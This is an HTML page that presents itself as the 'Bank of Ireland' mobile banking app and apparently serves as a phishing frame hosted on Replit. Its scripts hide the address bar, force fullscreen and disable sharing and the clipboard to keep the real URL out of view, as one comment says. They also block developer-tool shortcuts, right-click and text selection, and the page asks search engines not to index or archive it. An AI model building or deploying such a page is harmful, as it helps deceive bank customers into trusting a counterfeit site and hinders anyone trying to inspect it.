<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no" />
    
    <!-- Security Headers - Relaxed for PWA compatibility -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https: wss:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' wss: https: data:; worker-src 'self' blob:;">
    <meta name="referrer" content="no-referrer">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
    
    <!-- iOS Web App Configuration -->
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="default" />
    <meta name="apple-mobile-web-app-title" content="BOI Mobile" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="application-name" content="BOI Mobile" />
    <meta name="theme-color" content="#000DFF" />
    
    <!-- Critical font preloading for instant rendering -->
    <link rel="preload" href="/OpenSans-Regular-webfont.woff" as="font" type="font/woff" crossorigin>
    <link rel="preload" href="/OpenSans-Bold-webfont.woff" as="font" type="font/woff" crossorigin>
    <link rel="preload" href="/OpenSans-Semibold-webfont.woff" as="font" type="font/woff" crossorigin>
    
    <!-- Critical asset preloading -->
    <link rel="preload" href="/boi_logo.svg" as="image">
    <link rel="preload" href="/IMG_0633_1749764752035.jpeg" as="image">
    <link rel="preload" href="/icon_HID.svg" as="image">
    <link rel="preload" href="/Icons_Fingerprint.svg" as="image">
    
    <!-- Navigation icons preloading -->
    <link rel="preload" href="/icon-footer-accounts.svg" as="image">
    <link rel="preload" href="/icon-footer-accounts-highlight.svg" as="image">
    <link rel="preload" href="/icon-footer-payments.svg" as="image">
    <link rel="preload" href="/icon-footer-payments-highlight.svg" as="image">
    <link rel="preload" href="/icon-footer-services.svg" as="image">
    <link rel="preload" href="/icon-footer-services-highlight.svg" as="image">
    <link rel="preload" href="/icon-footer-apply.svg" as="image">
    <link rel="preload" href="/icon-footer-apply-highlight.svg" as="image">
    <link rel="preload" href="/icon-footer-more.svg" as="image">
    <link rel="preload" href="/icon-footer-more-highlight.svg" as="image">
    
    <!-- PWA Manifest -->
    <link rel="manifest" href="/manifest.json" />
    
    <!-- App Icons for different devices -->
    <link rel="apple-touch-icon" sizes="57x57" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="60x60" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="72x72" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="76x76" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="114x114" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="120x120" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="144x144" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="152x152" href="/boi_app_icon.png" />
    <link rel="apple-touch-icon" sizes="180x180" href="/boi_app_icon.png" />
    <link rel="icon" type="image/png" sizes="192x192" href="/boi_app_icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/boi_app_icon.png" />
    <link rel="icon" type="image/png" sizes="96x96" href="/boi_app_icon.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/boi_app_icon.png" />
    
    <title>Bank of Ireland</title>
  </head>
  <body style="background: transparent !important;">
    <!-- PWA Loading Screen -->
    <div id="pwa-loading" style="
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: linear-gradient(135deg, #126987 0%, #0e5a75 100%);
      display: flex; align-items: center; justify-content: center;
      flex-direction: column; color: white; z-index: 9999;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    ">
      <img src="/boi_app_icon.png" alt="BOI" style="width: 80px; height: 80px; margin-bottom: 20px;">
      <div style="font-size: 24px; font-weight: bold; margin-bottom: 10px;">Bank of Ireland</div>
      <div id="loading-message" style="font-size: 14px; margin-bottom: 20px;">Loading your banking app...</div>
      <div style="
        width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3);
        border-radius: 50%; border-top-color: white;
        animation: spin 1s linear infinite;
      "></div>
      <div id="error-message" style="
        display: none; text-align: center; max-width: 300px;
        margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.1);
        border-radius: 8px; line-height: 1.4;
      "></div>
      <button id="retry-button" style="
        display: none; margin-top: 15px; padding: 12px 24px;
        background: white; color: #126987; border: none;
        border-radius: 6px; font-weight: 600; cursor: pointer;
      " onclick="retryAppLoad()">Retry</button>
    </div>
    
    <div id="root" style="background: transparent !important;"></div>
    
    <style>
      @keyframes spin { to { transform: rotate(360deg); } }
      
      /* Responsive viewport fixes */
      @media screen and (max-width: 768px) {
        html { font-size: 16px; }
        body { 
          -webkit-text-size-adjust: 100%; 
          -ms-text-size-adjust: 100%;
          touch-action: manipulation;
        }
      }
      
      /* PWA-specific styles */
      @media all and (display-mode: standalone) {
        html, body { 
          height: 100vh;
          height: calc(var(--vh, 1vh) * 100);
          padding-top: env(safe-area-inset-top);
          padding-bottom: env(safe-area-inset-bottom);
          padding-left: env(safe-area-inset-left);
          padding-right: env(safe-area-inset-right);
          overflow-x: hidden;
        }
        
        #root {
          min-height: 100vh;
          min-height: calc(var(--vh, 1vh) * 100);
        }
      }
      
      /* Fix for iOS viewport issues */
      @supports (-webkit-touch-callout: none) {
        html, body {
          height: -webkit-fill-available;
        }
        
        #root {
          min-height: -webkit-fill-available;
        }
      }
      
      /* Error state styles */
      .error-state {
        background: #dc2626 !important;
        color: white !important;
      }
    </style>
    
    <script>
      // Set theme color to correct blue immediately before React loads
      const themeColorMeta = document.querySelector('meta[name="theme-color"]');
      if (themeColorMeta) {
        themeColorMeta.setAttribute('content', '#000DFF');
      }

      // Security measures to prevent sharing and copying
      document.addEventListener('DOMContentLoaded', function() {
        // Disable right-click context menu
        document.addEventListener('contextmenu', function(e) {
          e.preventDefault();
          return false;
        });

        // Security restrictions that don't interfere with form inputs
        document.addEventListener('selectstart', function(e) {
          // Allow text selection in form elements
          if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            return true;
          }
          e.preventDefault();
          return false;
        });

        // Disable keyboard shortcuts for security (excluding form interference)
        document.addEventListener('keydown', function(e) {
          // Allow all keyboard input in form elements
          if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            return true;
          }
          
          // Block developer tools shortcuts only outside forms
          if (e.key === 'F12' || 
              (e.ctrlKey && e.shiftKey && ['I', 'C', 'J'].includes(e.key))) {
            e.preventDefault();
            return false;
          }
        });

        // Disable image drag
        const images = document.querySelectorAll('img');
        images.forEach(img => {
          img.addEventListener('dragstart', function(e) {
            e.preventDefault();
            return false;
          });
        });

        // Hide URL bar on mobile
        if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
          setTimeout(function() {
            window.scrollTo(0, 1);
          }, 100);
        }

        // Prevent sharing via Web Share API detection
        if ('share' in navigator) {
          // Override the share function
          navigator.share = function() {
            return Promise.reject(new Error('Sharing is disabled for security reasons'));
          };
        }
      });

      // Developer tools detection removed - was causing form interference

      // PWA App Initialization with Error Handling
      let appLoadTimeout;
      let retryCount = 0;
      const maxRetries = 3;
      
      function updateLoadingMessage(message) {
        const loadingMsg = document.getElementById('loading-message');
        if (loadingMsg) loadingMsg.textContent = message;
      }
      
      function showError(message) {
        const loadingScreen = document.getElementById('pwa-loading');
        const errorMsg = document.getElementById('error-message');
        const retryBtn = document.getElementById('retry-button');
        
        if (loadingScreen) loadingScreen.classList.add('error-state');
        if (errorMsg) {
          errorMsg.textContent = message;
          errorMsg.style.display = 'block';
        }
        if (retryBtn) retryBtn.style.display = 'block';
      }
      
      function hideLoading() {
        const loadingScreen = document.getElementById('pwa-loading');
        if (loadingScreen) {
          loadingScreen.style.opacity = '0';
          loadingScreen.style.transition = 'opacity 0.3s ease';
          setTimeout(() => {
            loadingScreen.style.display = 'none';
          }, 300);
        }
      }
      
      function retryAppLoad() {
        retryCount++;
        if (retryCount > maxRetries) {
          showError('Multiple attempts failed. Please check your connection and refresh the page.');
          return;
        }
        
        updateLoadingMessage(`Retrying... (${retryCount}/${maxRetries})`);
        document.getElementById('error-message').style.display = 'none';
        document.getElementById('retry-button').style.display = 'none';
        document.getElementById('pwa-loading').classList.remove('error-state');
        
        setTimeout(initializeApp, 1000);
      }
      
      function initializeApp() {
        clearTimeout(appLoadTimeout);
        
        // Set timeout for app initialization with device-specific timing
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const timeout = isMobile ? 20000 : 15000; // Longer timeout for mobile devices
        
        appLoadTimeout = setTimeout(() => {
          console.error('App initialization timeout');
          showError('App is taking longer than expected to load. This might be due to a slow connection.');
        }, timeout);
        
        // Enhanced React mount detection with fallbacks
        let checkCount = 0;
        const maxChecks = 300; // 30 seconds at 100ms intervals
        
        const checkAppReady = setInterval(() => {
          checkCount++;
          const root = document.getElementById('root');
          
          // Check for successful React mount
          if (root && root.children.length > 0) {
            clearInterval(checkAppReady);
            clearTimeout(appLoadTimeout);
            hideLoading();
            return;
          }
          
          // Fallback if checks exceed maximum
          if (checkCount >= maxChecks) {
            clearInterval(checkAppReady);
            clearTimeout(appLoadTimeout);
            
            // Try to force app load with emergency fallback
            try {
              if (root && !root.children.length) {
                root.innerHTML = '<div style="padding: 20px; text-align: center; font-family: Arial, sans-serif;"><h2>Loading Bank of Ireland...</h2><p>Please wait while we prepare your banking experience.</p></div>';
              }
              hideLoading();
            } catch (error) {
              showError('Unable to load the application. Please refresh the page.');
            }
          }
        }, 100);
        
        // The main React app script is already in the HTML
        console.log('Waiting for React app to mount...');
      }
      
      // Enhanced service worker registration for mobile PWA
      if ('serviceWorker' in navigator) {
        updateLoadingMessage('Preparing offline features...');
        
        navigator.serviceWorker.register('/sw.js', {
          scope: '/',
          updateViaCache: 'none'
        }).then(async (registration) => {
          console.log('Service Worker registered:', registration.scope);
          
          // Force immediate activation for better mobile experience
          if (registration.waiting) {
            registration.waiting.postMessage({ type: 'SKIP_WAITING' });
          }
          
          // Listen for updates and auto-activate
          registration.addEventListener('updatefound', () => {
            const newWorker = registration.installing;
            if (newWorker) {
              newWorker.addEventListener('statechange', () => {
                if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
                  console.log('New service worker available');
                  newWorker.postMessage({ type: 'SKIP_WAITING' });
                }
              });
            }
          });
          
          // Ensure service worker takes control immediately
          if (!navigator.serviceWorker.controller) {
            console.log('Claiming service worker control for mobile');
            await registration.update();
          }
          
          updateLoadingMessage('Loading banking app...');
          setTimeout(initializeApp, 500);
          
        }).catch((error) => {
          console.error('Service worker registration failed:', error);
          updateLoadingMessage('Loading banking app...');
          setTimeout(initializeApp, 500);
        });
        
        // Listen for service worker messages
        navigator.serviceWorker.addEventListener('message', (event) => {
          if (event.data && event.data.type === 'SW_ACTIVATED') {
            console.log('Service worker activated for offline support');
          }
        });
      } else {
        // No service worker support, load app directly
        updateLoadingMessage('Loading banking app...');
        setTimeout(initializeApp, 500);
      }
      
      // Handle app visibility changes
      document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'visible') {
          // App became visible, check if it's working
          const root = document.getElementById('root');
          if (!root || root.children.length === 0) {
            const loadingScreen = document.getElementById('pwa-loading');
            if (loadingScreen && loadingScreen.style.display === 'none') {
              // App was supposed to be loaded but root is empty
              loadingScreen.style.display = 'flex';
              showError('App lost connection. Refreshing...');
              setTimeout(() => window.location.reload(), 2000);
            }
          }
        }
      });
      
      // PWA Error Logging and Reporting System
      function logPWAError(error, context = '') {
        const isPWA = window.matchMedia('(display-mode: standalone)').matches;
        const errorData = {
          timestamp: new Date().toISOString(),
          isPWA: isPWA,
          context: context,
          userAgent: navigator.userAgent,
          url: window.location.href,
          error: {
            message: error.message || error,
            stack: error.stack,
            name: error.name
          }
        };
        
        console.error('PWA Error:', errorData);
        
        // Store errors locally for debugging
        try {
          const errors = JSON.parse(localStorage.getItem('pwa-errors') || '[]');
          errors.push(errorData);
          // Keep only last 50 errors
          if (errors.length > 50) errors.splice(0, errors.length - 50);
          localStorage.setItem('pwa-errors', JSON.stringify(errors));
        } catch (e) {
          console.error('Failed to store error:', e);
        }
        
        return errorData;
      }
      
      // Global error handler for unhandled errors
      window.addEventListener('error', (event) => {
        logPWAError(event.error, 'Global error handler');
        const loadingScreen = document.getElementById('pwa-loading');
        if (loadingScreen && loadingScreen.style.display !== 'none') {
          showError('Error loading app components. Please try again.');
        }
      });
      
      // Global promise rejection handler
      window.addEventListener('unhandledrejection', (event) => {
        logPWAError(event.reason, 'Unhandled promise rejection');
        const loadingScreen = document.getElementById('pwa-loading');
        if (loadingScreen && loadingScreen.style.display !== 'none') {
          showError('Network error occurred. Please check your connection.');
        }
      });
      
      // PWA-specific event listeners
      if (window.matchMedia('(display-mode: standalone)').matches) {
        console.log('Running in PWA mode');
        
        // Detect PWA launch
        window.addEventListener('load', () => {
          logPWAError({ message: 'PWA launched' }, 'PWA launch event');
        });
        
        // Handle orientation changes
        window.addEventListener('orientationchange', () => {
          setTimeout(() => {
            // Force layout recalculation
            document.body.style.height = '100vh';
            window.scrollTo(0, 0);
          }, 100);
        });
        
        // Handle resize events for different devices
        window.addEventListener('resize', () => {
          clearTimeout(window.resizeTimeout);
          window.resizeTimeout = setTimeout(() => {
            const vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', vh + 'px');
          }, 100);
        });
        
        // Set initial viewport height
        const vh = window.innerHeight * 0.01;
        document.documentElement.style.setProperty('--vh', vh + 'px');
      }

      // Additional mobile-specific URL hiding
      window.addEventListener('load', function() {
        // Force fullscreen on mobile devices
        if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
          // Hide address bar completely
          setTimeout(function() {
            window.scrollTo(0, 1);
            
            // Request fullscreen if available
            if (document.documentElement.requestFullscreen) {
              document.documentElement.requestFullscreen().catch(() => {});
            } else if (document.documentElement.webkitRequestFullscreen) {
              document.documentElement.webkitRequestFullscreen().catch(() => {});
            }
          }, 1000);
        }
      });

      // Prevent URL visibility in sharing menus
      if ('navigator' in window && 'share' in navigator) {
        // Override Web Share API completely
        Object.defineProperty(navigator, 'share', {
          value: function() {
            return Promise.reject(new Error('Sharing disabled for security'));
          },
          writable: false,
          configurable: false
        });
      }

      // Block clipboard operations
      if ('navigator' in window && 'clipboard' in navigator) {
        Object.defineProperty(navigator, 'clipboard', {
          value: {
            writeText: () => Promise.reject(new Error('Clipboard disabled')),
            readText: () => Promise.reject(new Error('Clipboard disabled')),
            write: () => Promise.reject(new Error('Clipboard disabled')),
            read: () => Promise.reject(new Error('Clipboard disabled'))
          },
          writable: false,
          configurable: false
        });
      }
    </script>
    <script type="module" src="/src/main.tsx"></script>
    <!-- This is a replit script which adds a banner on the top of the page when opened in development mode outside the replit environment -->
    <script type="text/javascript" src="https://replit.com/public/js/replit-dev-banner.js"></script>
  </body>
